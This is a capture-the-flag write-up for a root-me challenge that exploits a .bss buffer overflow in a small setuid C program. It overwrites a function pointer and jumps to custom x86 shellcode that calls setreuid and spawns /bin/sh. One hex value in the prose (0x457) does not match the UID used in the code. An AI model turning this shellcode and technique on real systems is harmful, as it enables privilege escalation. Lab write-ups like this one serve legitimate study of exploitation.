
# ELF x86 - BSS buffer overflow

[Task link](https://www.root-me.org/en/Challenges/App-System/ELF-x86-BSS-buffer-overflow)

Solved: [@novitoll](https://github.com/novitoll), [@Thatskriptkid](https://github.com/Thatskriptkid)

### Source

```c
    #include <stdio.h>
    #include <stdlib.h>
     
    char username[512] = {1};
    void (*_atexit)(int) =  exit;
     
    void cp_username(char *name, const char *arg)
    {
      while((*(name++) = *(arg++)));
      *name = 0;
    }
     
    int main(int argc, char **argv)
    {
      if(argc != 2)
        {
          printf("[-] Usage : %s <username>\n", argv[0]);
          exit(0);
        }
       
      cp_username(username, argv[1]);
      printf("[+] Running program with username : %s\n", username);
       
      _atexit(0);
      return 0;
    }

```

Vuln: BoF on `username` 512-byte which is located in `.bss` section. Overflow username, smash `_atexit` ptr to point back to username buffer where we put our payload.
Note: Most of exploits you will find for this challenge are not valid anymore as your shellcode requires the change in order to run in proper UID, GID if you use [sys_setreuid16](https://syscalls.kernelgrok.com/) syscall which you can trigger via `0x46 $eax`.

### Walkthrough

`username` is located in `$ebx+0x40` which has 512 bytes (0x200) buffer:

![username](https://github.com/Novitoll/writeups/blob/master/root-me/app-system/elf-x86-bss-stack-overflow/pics/2.png)

and then after `$ebx+0x40+0x200` there is `_atexit` which has rvalue pointing to `exit@plt`.

![_atexit](https://github.com/Novitoll/writeups/blob/master/root-me/app-system/elf-x86-bss-stack-overflow/pics/3.png)

Let's run it with 512 "A" and "B" to fill `username` buffer and override `_atexit` with "B"s. And put the breakpoint on `0x080484f1 call   0x8048466 <cp_username>`

![_atexit](https://github.com/Novitoll/writeups/blob/master/root-me/app-system/elf-x86-bss-stack-overflow/pics/4.png)

and we can see that we control the `_atexit` ptr which goes right after our username buffer:

![_atexit](https://github.com/Novitoll/writeups/blob/master/root-me/app-system/elf-x86-bss-stack-overflow/pics/5.png)


### Shellcode

We can use this shellcode as NX-bit is disabled for us. However, we need to modify it in order to run with right UID (1207), GID (1107):

![_atexit](https://github.com/Novitoll/writeups/blob/master/root-me/app-system/elf-x86-bss-stack-overflow/pics/6.png)

For that let's take the original shellcode and create a `shellcode.nasm` and modify it. As you can see in original shellcode, it's used for getting root user `uid=0, gid=0`, so that XOR-ing `ebx, ecx` registers is enough for that and pushing to `eax 0x46` (setreuid syscall) and triggering it via `int 0x80` works.

```
  "\x6a\x46"			// push   $0x46
  "\x58"			// pop    %eax
  "\x31\xdb"			// xor	  %ebx, %ebx
  "\x31\xc9"			// xor	  %ecx, %ecx
  "\xcd\x80"			// int    $0x80
```

Now, our UID is 1207 (0x457), it's 2 bytes. If we put it to `ebx, ecx` registers which are *4 bytes* we will get extra 2 `0x00` bytes padding per each register, which will make our shellcode invalid. So we can use `bx, cx` registers which are 2-bytes and make it work. You can even split it to `bh, bl` (1-byte) into 2 instructions, but in our case `bx, cx` regs. are fine.

Here is our shellcode:

```
section .text

global _start

_start:
	push   0x46
	pop    eax
	mov    bx, 0x4b7
	mov    cx, 0x453
	int    0x80

	xor    edx, edx
	push   0xb
	pop    eax
	push   edx
	push   0x68732f2f
	push   0x6e69622f
	mov    ebx, esp
	push   edx
	push   ebx
	mov    ecx, esp
	int    0x80
```

Now create the object, make ELF executable, takes the opcodes from objdump and get the shellcode string via [this online disassembly tool](https://defuse.ca/online-x86-assembler.htm#disassembly2):

```
$ nasm -f elf -o shellcode.o shellcode.nasm
$ ld -m elf_i386 -o shellcode shellcode.o
$ objdump -d shellcode
```

And now you can PWN!

![_atexit](https://github.com/Novitoll/writeups/blob/master/root-me/app-system/elf-x86-bss-stack-overflow/pics/pwn.png)

